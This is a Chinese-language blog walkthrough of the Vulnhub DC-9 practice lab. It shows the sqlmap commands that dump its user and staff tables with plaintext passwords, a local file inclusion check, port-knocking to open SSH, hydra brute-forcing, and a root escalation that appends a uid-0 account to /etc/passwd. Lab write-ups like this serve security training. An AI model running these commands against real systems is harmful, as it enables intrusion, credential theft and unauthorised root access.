---
title: DC-9复现
permalink: /archives/5012/
published: 2022-12-01 16:50:00
tags: 
  - vulnhub
  - 渗透测试
category: 靶场&靶机
---
# DC-9复现

# 描述

> DC-9是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
>
> 这个挑战的最终目标是获得根并阅读唯一的标志。
>
> Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。
>
> 对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。

# 信息收集

确定目标的ip以及开启的端口

![image-20221201165354852](./images/image-20221201165354852.png)

发现有一个完整的表单，那就直接sqlmap爆破数据库

![image-20221201165637107](./images/image-20221201165637107.png)

```bash
sqlmap -u "http://192.168.71.131/results.php"  --data "search=1" --dbs
```

爆出三个库

![image-20221201165842274](./images/image-20221201165842274.png)

爆破表

```bash
sqlmap -u "http://192.168.71.131/results.php"  --data "search=1" -D users --tables
```

![image-20221201170044666](./images/image-20221201170044666.png)

爆破列

```bash
sqlmap -u "http://192.168.71.131/results.php"  --data "search=1" -D users -T UserDetails --dump
```

```text
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```

同理爆破另一个库，其中的一个库的**Users**表爆出了admin的密码

![image-20221201170903369](./images/image-20221201170903369.png)

**StaffDetails**表的内容

```text
Database: Staff
Table: StaffDetails
[17 entries]
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
```

# 登录后台

![image-20221201170938946](./images/image-20221201170938946.png)

脚标处有一句 `File does not exist `，判断是不是存在本地文件包含漏洞

验证存在

![image-20221201171921652](./images/image-20221201171921652.png)

然后要利用到端口敲门：

原理简单分析：
端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。
　　
简单来说就是：知道它的自定义端口后，依次对其进行敲门，然后就可以开启ssh服务从而进行连接了。它的默认配置文件为：/etc/knockd.conf

![image-20221201172310863](./images/image-20221201172310863.png)

```bash
nmap -p 7469 192.168.71.131
nmap -p 8475 192.168.71.131
nmap -p 9842 192.168.71.131
```

执行完以上命令后再查看22端口的ssh服务，就看到是已经打开了

```bash
nmap -p 22 192.168.71.131
```

![image-20221201172545368](./images/image-20221201172545368.png)

利用前面信息收集到的员工账号密码做一个字典，然后进行爆破

# ssh登录

```bash
hydra -L dc9_users.txt -P dc9_pass.txt 192.168.71.131 ssh
```

![image-20221201173634705](./images/image-20221201173634705.png)

爆破出三个账号密码，随便一个账号登录上去，发现我们现在只是爆破出了部分账户而已

![image-20221201174103178](./images/image-20221201174103178.png)

利用su命令切换我们爆破出的用户，发现在janitor的目录下有一个文件夹里记录了其他用户的密码

![image-20221201174344319](./images/image-20221201174344319.png)

那我们直接加到我们的密码本里，再爆破一次，果然爆出了一个新的

![image-20221201174707763](./images/image-20221201174707763.png)

登录到fredf，发现可以执行 `sudo -l`可以看到该账号可以运行root权限的test文件，而且不需要密码

![image-20221201174840644](./images/image-20221201174840644.png)

然后找到了这个文件的源码

![image-20221201175410975](./images/image-20221201175410975.png)

经过查看发现这个py文件的大致内容就是将参数1的内容写入参数2中，接下来尝试进行提权

# 提权

```bash
openssl passwd -1 -salt admin 111111
echo 'admin:$1$admin$2WRLhTGcIMgZ7OhwCpREK1:0:0::/root:/bin/bash' >> /tmp/aaa
sudo /opt/devstuff/dist/test/test /tmp/aaa /etc/passwd
su admin
cd /root
cat theflag.txt 
```

![image-20221201180059726](./images/image-20221201180059726.png)

- [参考博客]([(19条消息)) vulnhub靶机DC-9渗透测试_Long_gone的博客-CSDN博客](https://blog.csdn.net/Long_gone/article/details/104049869?ops_request_misc=%7B%22request%5Fid%22%3A%22166988492316782412557232%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=166988492316782412557232&biz_id=0&spm=1018.2226.3001.4187))
